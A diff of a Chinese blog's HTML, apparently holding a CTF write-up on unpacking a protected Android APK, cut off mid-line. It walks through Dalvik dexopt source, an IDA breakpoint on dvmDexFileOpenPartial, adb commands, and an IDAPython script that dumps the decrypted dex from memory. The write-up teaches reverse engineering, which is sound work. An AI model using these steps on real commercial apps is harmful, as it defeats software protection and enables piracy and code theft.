-<h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p>不管上层怎么加固，最终加载到内存的dex肯定不是加固的，所以这个dex就是我们想要的.</p>
-<h3 id="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex"><a href="#为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex" class="headerlink" title="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?"></a>为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?</h3><p>dalvik虚拟机会把dex文件优化为odex文件,而优化的源代码为<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Main entry point.  Decide where to go.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--zip"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromZip(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--dex"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromDex(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--preopt"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> preopt(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>其中fromzip和preopt都会调用processZipFile先将dex文件提取出来,fromDex则直接调用dvmContinueOptimization优化.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Common functionality for normal device-side processing as well as</span></span><br><span class="line"><span class="comment"> * preoptimization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">processZipFile</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd, <span class="keyword">const</span> <span class="keyword">char</span>* zipName,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *dexoptFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   	...</span><br><span class="line">    <span class="keyword">int</span> result = extractAndProcessZip(zipFd, cacheFd, zipName, isBootstrap,</span><br><span class="line">            bcp, dexoptFlags);</span><br><span class="line">    <span class="built_in">free</span>(bcpCopy);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在extractAndProcessZip中处理zip文件并将dex提取出来,随后调用优化函数<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extract "classes.dex" from zipFd into "cacheFd", leaving a little space</span></span><br><span class="line"><span class="comment"> * up front for the DEX optimization header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">extractAndProcessZip</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* debugFileName, <span class="keyword">bool</span> isBootstrap, <span class="keyword">const</span> <span class="keyword">char</span>* bootClassPath,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* dexoptFlagStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Open the zip archive, find the DEX entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipPrepArchive(zipFd, debugFileName, &amp;zippy) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: unable to open zip archive '%s'"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    zipEntry = dexZipFindEntry(&amp;zippy, kClassesDex);</span><br><span class="line">    <span class="keyword">if</span> (zipEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive '%s' does not include %s"</span>,</span><br><span class="line">            debugFileName, kClassesDex);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract some info about the zip entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipGetEntryInfo(&amp;zippy, zipEntry, <span class="literal">NULL</span>, &amp;uncompLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;modWhen, &amp;crc32) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive GetEntryInfo failed on %s"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    uncompLen = uncompLen;</span><br><span class="line">    modWhen = modWhen;</span><br><span class="line">    crc32 = crc32;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract the DEX data into the cache file at the current offset.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipExtractEntryToFile(&amp;zippy, zipEntry, cacheFd) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: extraction of %s from %s failed"</span>,</span><br><span class="line">            kClassesDex, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">   	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prep the VM and perform the optimization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode,</span><br><span class="line">            dexoptFlags) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"DexOptZ: VM init failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//vmStarted = 1;</span></span><br><span class="line">    <span class="comment">/* do the optimization */</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmContinueOptimization(cacheFd, dexOffset, uncompLen, debugFileName,</span><br><span class="line">            modWhen, crc32, isBootstrap))</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Optimization failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>dvmContinueOptimization函数位于/dalvik/vm/analysis/DexPrepare.cpp文件,其中调用了dvmDexFileOpenPartial.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do the actual optimization. This is executed in the dexopt process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For best use of disk/memory, we want to extract once and perform</span></span><br><span class="line"><span class="comment"> * optimizations in place. If the file has to expand or contract</span></span><br><span class="line"><span class="comment"> * to match local structure padding/alignment expectations, we want</span></span><br><span class="line"><span class="comment"> * to do the rewrite as part of the extract, rather than extracting</span></span><br><span class="line"><span class="comment"> * into a temp file and slurping it back out. (The structure alignment</span></span><br><span class="line"><span class="comment"> * is currently correct for all platforms, and this isn't expected to</span></span><br><span class="line"><span class="comment"> * change, so we should be okay with having it already extracted.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns "true" on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dvmContinueOptimization</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> dexOffset, <span class="keyword">long</span> dexLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* fileName, u4 modWhen, u4 crc, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,</span><br><span class="line">                    doVerify, doOpt, &amp;pClassLookup, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            DvmDex* pDvmDex = <span class="literal">NULL</span>;</span><br><span class="line">            u1* dexAddr = ((u1*) mapAddr) + dexOffset;</span><br><span class="line">            <span class="keyword">if</span> (dvmDexFileOpenPartial(dexAddr, dexLength, &amp;pDvmDex) != <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Unable to create DexFile"</span>);</span><br><span class="line">                success = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>dvmDexFileOpenPartial调用了dexFileParse,用来解析内存中优化过或未优化过的dex文件,返回dexFile结构.<br>所以此时dex文件已经被加载进内存,就可以dump出来了.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a DexFile structure for a "partial" DEX. This is one that is in</span></span><br><span class="line"><span class="comment"> * the process of being optimized. The optimization header isn't finished</span></span><br><span class="line"><span class="comment"> * and we won't have any of the auxillary data tables, so we have to do</span></span><br><span class="line"><span class="comment"> * the initialization slightly differently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns nonzero on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenPartial</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* addr, <span class="keyword">int</span> len, DvmDex** ppDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DvmDex* pDvmDex;</span><br><span class="line">    DexFile* pDexFile;</span><br><span class="line">    <span class="keyword">int</span> parseFlags = kDexParseDefault;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* -- file is incomplete, new checksum has not yet been calculated</span></span><br><span class="line"><span class="comment">    if (gDvm.verifyDexChecksum)</span></span><br><span class="line"><span class="comment">        parseFlags |= kDexParseVerifyChecksum;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pDexFile = dexFileParse((u1*)addr, len, parseFlags);</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"DEX parse failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="赛题分析"><a href="#赛题分析" class="headerlink" title="赛题分析"></a>赛题分析</h2><h3 id="jeb打开apk，查看Manifest"><a href="#jeb打开apk，查看Manifest" class="headerlink" title="jeb打开apk，查看Manifest"></a>jeb打开apk，查看Manifest</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bvqfxcnj31je0ngacl.jpg" alt=""></p>
-<h3 id="反编译查看源代码"><a href="#反编译查看源代码" class="headerlink" title="反编译查看源代码"></a>反编译查看源代码</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bzdzyitj31d00oewg7.jpg" alt=""></p>
-<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>asset目录中的jar文件被处理了，打不开，也不知道处理逻辑<br>libs目录中的三个so文件，唯一加载了libmobisec.so文件了<br>所以说被加固的源程序可能存在于so文件，也可能存在于asset文件里。</p>
-<h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><h3 id="得到libdvm-so文件"><a href="#得到libdvm-so文件" class="headerlink" title="得到libdvm.so文件"></a>得到libdvm.so文件</h3><p><code>adb pull /system/lib/libdvm.so</code></p>
-<h3 id="在dvmDexFileOpenPartial下断点"><a href="#在dvmDexFileOpenPartial下断点" class="headerlink" title="在dvmDexFileOpenPartial下断点"></a>在dvmDexFileOpenPartial下断点</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0c9qazoaj30x409ltck.jpg" alt=""></p>
-<h3 id="IDA-attach并断下"><a href="#IDA-attach并断下" class="headerlink" title="IDA attach并断下"></a>IDA attach并断下</h3><p>adb shell am start -D -n com.ali.tg.testapp/.MainActivity<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cmoer7bj30zl073gp5.jpg" alt=""><br>dvmDexFileOpenPartial函数的第一个参数就是dex内存起始地址，第二个参数就是dex大小。<br>R0:0x753EF008<br>R1:0x000941FC</p>
-<h3 id="dump脚本"><a href="#dump脚本" class="headerlink" title="dump脚本"></a>dump脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">start_addr=<span class="number">0x753EF008</span></span><br><span class="line">fike_len=<span class="number">0x000941FC</span></span><br><span class="line">data=idaapi.dbg_read_memory(start_addr,fike_len)</span><br><span class="line">f=open(<span class="string">r'dump.dex'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cpgd28kj30zu0n4wjs.jpg" alt=""></p>
-<h3 id="反编译dex为smali，进行分析"><a href="#反编译dex为smali，进行分析" class="headerlink" title="反编译dex为smali，进行分析"></a>反编译dex为smali，进行分析</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0d78f8gsj31im0xy41l.jpg" alt=""></p>
-
-          
+          前置知识http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/http://blog.csdn.net/jiangwei0910410003/article/details/48104581
+赛题链接https://github.com/eternals
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/01/ali_re3/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1055,7 +1110,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1128,6 +1183,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/01/ALICTF_evalapk_3/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/02/01/ALICTF_evalapk_3/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1154,26 +1220,16 @@
       
         
           
-            <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a href="http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/" target="_blank" rel="noopener">http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/</a><br><a href="http://blog.csdn.net/jiangwei0910410003/article/details/48104581" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/48104581</a></p>
-<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk</a><br>可能是因为赛题是14年的，有点老了，所以在5.0.1上运行失败，用android 4.4.4就可以运行了。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h3><p>现在市场中加固apk的方式一般就是两种：一种是对源apk整体做一个加固，放到指定位置，运行的时候在解密动态加载，还有一种是对so进行加固，在so加载内存的时候进行解密释放。我们今天主要看第一种加固方式，就是对apk整体进行加固。<br>当我们发现apk中主要的类都没有了，肯定是apk被加固了，加固的源程序肯定是在本地，一般会有这么几个地方需要注意的：<br>1、应用程序的asset目录，我们知道这个目录是不参与apk的资源编译过程的，所以很多加固的应用喜欢把加密之后的源apk放到这里<br>2、把源apk加密放到壳的dex文件的尾部，这个肯定不是我们这里的案例，但是也有这样的加固方式，<strong>这种加固方式会发现使用dex2jar工具解析dex是失败的</strong>，我们这时候就知道了，肯定对dex做了手脚<br>3、把源apk加密放到so文件中，这个就比较难了，一般都是把源apk进行拆分，存到so文件中，分析难度会加大的。</p>
-<h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p>不管上层怎么加固，最终加载到内存的dex肯定不是加固的，所以这个dex就是我们想要的.</p>
-<h3 id="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex"><a href="#为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex" class="headerlink" title="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?"></a>为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?</h3><p>dalvik虚拟机会把dex文件优化为odex文件,而优化的源代码为<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Main entry point.  Decide where to go.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--zip"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromZip(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--dex"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromDex(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--preopt"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> preopt(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>其中fromzip和preopt都会调用processZipFile先将dex文件提取出来,fromDex则直接调用dvmContinueOptimization优化.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Common functionality for normal device-side processing as well as</span></span><br><span class="line"><span class="comment"> * preoptimization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">processZipFile</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd, <span class="keyword">const</span> <span class="keyword">char</span>* zipName,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *dexoptFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   	...</span><br><span class="line">    <span class="keyword">int</span> result = extractAndProcessZip(zipFd, cacheFd, zipName, isBootstrap,</span><br><span class="line">            bcp, dexoptFlags);</span><br><span class="line">    <span class="built_in">free</span>(bcpCopy);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在extractAndProcessZip中处理zip文件并将dex提取出来,随后调用优化函数<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extract "classes.dex" from zipFd into "cacheFd", leaving a little space</span></span><br><span class="line"><span class="comment"> * up front for the DEX optimization header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">extractAndProcessZip</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* debugFileName, <span class="keyword">bool</span> isBootstrap, <span class="keyword">const</span> <span class="keyword">char</span>* bootClassPath,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* dexoptFlagStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Open the zip archive, find the DEX entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipPrepArchive(zipFd, debugFileName, &amp;zippy) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: unable to open zip archive '%s'"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    zipEntry = dexZipFindEntry(&amp;zippy, kClassesDex);</span><br><span class="line">    <span class="keyword">if</span> (zipEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive '%s' does not include %s"</span>,</span><br><span class="line">            debugFileName, kClassesDex);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract some info about the zip entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipGetEntryInfo(&amp;zippy, zipEntry, <span class="literal">NULL</span>, &amp;uncompLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;modWhen, &amp;crc32) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive GetEntryInfo failed on %s"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    uncompLen = uncompLen;</span><br><span class="line">    modWhen = modWhen;</span><br><span class="line">    crc32 = crc32;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract the DEX data into the cache file at the current offset.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipExtractEntryToFile(&amp;zippy, zipEntry, cacheFd) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: extraction of %s from %s failed"</span>,</span><br><span class="line">            kClassesDex, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">   	...</span><br><span class="line">    <span 